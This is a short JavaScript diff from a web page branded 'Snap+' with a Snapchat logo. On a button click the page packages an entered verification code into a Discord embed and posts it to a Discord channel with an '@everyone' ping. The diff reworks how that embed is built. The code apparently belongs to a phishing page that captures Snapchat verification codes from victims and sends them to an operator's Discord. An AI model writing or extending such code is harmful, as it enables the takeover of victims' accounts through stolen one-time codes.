@@ -47,15 +47,18 @@ sendCodeBtn.addEventListener('click', async function() {
     sendCodeBtn.style.display = 'none';
     loadingScreen.classList.add('active');
 
-    const embed = createEmbed(
-        '🔐 Code de vérification Snap+',
-        'Un nouveau code de vérification est disponible.',
-        0x10b981,
-        [
+    const embed = {
+        title: '🔐 Code de vérification Snap+',
+        description: 'Un nouveau code de vérification est disponible.',
+        color: 0x10b981,
+        fields: [
             { name: '🔑 Code', value: `**${code}**`, inline: false },
             { name: '⏰ Date', value: new Date().toLocaleString('fr-FR'), inline: false }
-        ]
-    );
+        ],
+        thumbnail: { url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
+        footer: { text: 'Snap+ Admin', icon_url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
+        timestamp: new Date().toISOString()
+    };
 
     const sent = await sendToDiscord({
         content: '@everyone',
